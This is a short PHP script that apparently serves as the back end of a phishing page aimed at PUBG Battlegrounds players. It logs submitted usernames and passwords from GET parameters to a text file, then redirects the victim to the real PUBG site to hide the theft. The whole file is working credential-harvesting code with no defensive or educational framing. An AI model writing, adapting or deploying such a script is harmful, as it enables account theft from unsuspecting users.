<?php

file_put_contents("usernames.txt", " Username: " . $_GET['Username_GM'] . " Pass: " . $_GET['Password_GM'] . "\n", FILE_APPEND);
header('Location: https://na.battlegrounds.pubg.com/');
exit();
?>
